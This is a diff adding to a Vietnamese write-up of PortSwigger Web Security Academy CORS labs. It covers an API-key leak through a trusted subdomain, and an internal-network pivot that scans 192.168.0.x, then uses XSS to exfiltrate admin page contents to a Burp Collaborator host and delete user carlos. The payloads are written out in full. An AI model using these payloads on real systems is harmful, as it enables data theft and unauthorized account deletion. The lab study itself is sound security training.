@@ -173,8 +173,20 @@ Bạn có thể đăng nhập vào tài khoản của mình bằng thông tin đ
 
 Trong bài này chúng ta có 1 trang web bán hàng như sau : 
 
+Đăng nhập và bắt lại request có chưa APIKey. Thêm Origin Header bất kỳ để check xem có sử dụng CORS hay không.
 
 
+Như kết quả trả về ta thấy *Access-Control-Allow-Origin* và *Access-Control-Allow-Credentials* điều đó cho thấy có áp dụng CORS.
+
+Vì bài này chú tâm đến các giao thức nên mình sẽ thử những chức năng liên quan đến API, điển hình như trong web sẽ có chức năng Check Stock, chúng ta bắt request của chức năng này xem và phân tích.
+
+
+Như đã thấy thì chức năng này sẽ lấy data từ 1 tên miền phụ khác là : *http://stock.https://acfb1faa1ec0c6ec81f22d5200ae00ad.web-security-academy.net* chúng ta có thể lợi dụng tên miền này để leak APIKey như những bài trước, để kiểm tra giả thiết thì thử thay thế Origin Header ở phần account xem có được phép hay không
+
+
+
+
+Sau đó dựa theo form khai thác dựa trên tên miền phụ được phép truy cập dữ liệu như sau ;
 ```
 <script>
    document.location="http://stock.https://acfb1faa1ec0c6ec81f22d5200ae00ad.web-security-academy.net/?productId=4
@@ -183,7 +195,118 @@ Trong bài này chúng ta có 1 trang web bán hàng như sau :
    {location='https://exploit-ac131f241ecbc63281092d6d012d001e.web-security-academy.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
 </script>
 ```
+
+Sau đó Store payload Deliver to Victim để gửi payload sang trang web mà mình exploit
+
+
+
+Access log để hiện những data mà mình leak được thông qua tên miền phụ như sau ;
+
+Truy cập decoder của Burp để decoder url và lấy apikey để submit
+
+
+### Lab: CORS vulnerability with internal network pivot attack
+
+Trang web này có cấu hình CORS không an toàn ở chỗ nó tin cậy tất cả các nguồn gốc của mạng nội bộ.
+
+Lab này yêu cầu nhiều bước để hoàn thành. Để giải quyếtlab, hãy tạo một số JavaScript để định vị điểm cuối trên mạng cục bộ (192.168.0.0/24, cổng 8080) mà sau đó bạn có thể sử dụng để xác định và tạo một cuộc tấn công dựa trên CORS để xóa người dùng. Lab được giải quyết khi bạn xóa người dùng Carlos.
   
   
-  
-  
+Trường hợp mà bài lab này đưa ra đó chính là chúng ta phải tìm được vị trí của 1 private IP mà website này tin tưởng và dựa vào đó để tấn công và xóa đi người dùng, 
+
+
+```
+<script>
+var q = [], collaboratorURL = 'http://mmcdur1ianel3qw2y4in7zasbjha5z.burpcollaborator.net';
+for(i=1;i<=255;i++){
+  q.push(
+  function(url){
+    return function(wait){
+    fetchUrl(url,wait);
+    }
+  }('http://192.168.0.'+i+':8080'));
+}
+for(i=1;i<=20;i++){
+  if(q.length)q.shift()(i*100);
+}
+function fetchUrl(url, wait){
+  var controller = new AbortController(), signal = controller.signal;
+  fetch(url, {signal}).then(r=>r.text().then(text=>
+    {
+    location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now()
+  }
+  ))
+  .catch(e => {
+  if(q.length) {
+    q.shift()(wait);
+  }
+  });
+  setTimeout(x=>{
+  controller.abort();
+  if(q.length) {
+    q.shift()(wait);
+  }
+  }, wait);
+}
+</script>
+
+```
+
+
+
+```
+<script>
+function xss(url, text, vector) {
+  location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
+}
+
+function fetchUrl(url, collaboratorURL){
+  fetch(url).then(r=>r.text().then(text=>
+  {
+    xss(url, text, '"><img src='+collaboratorURL+'?foundXSS=1>');
+  }
+  ))
+}
+
+fetchUrl("http://192.168.0.219:8080", "http://mmcdur1ianel3qw2y4in7zasbjha5z.burpcollaborator.net");
+</script>
+
+```
+
+```
+<script>
+function xss(url, text, vector) {
+  location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
+}
+function fetchUrl(url, collaboratorURL){
+  fetch(url).then(r=>r.text().then(text=>
+  {
+    xss(url, text, '"><iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">');
+  }
+  ))
+}
+
+fetchUrl("http://192.168.0.219:8080", "http://mmcdur1ianel3qw2y4in7zasbjha5z.burpcollaborator.net");
+</script>
+
+```
+
+```
+<script>
+function xss(url, text, vector) {
+  location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
+}
+
+function fetchUrl(url){
+  fetch(url).then(r=>r.text().then(text=>
+  {
+    xss(url, text, '"><iframe src=/admin onload="var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\'carlos\',f.submit()">');
+  }
+  ))
+}
+
+fetchUrl("http://192.168.0.219:8080");
+</script>
+
+```
+
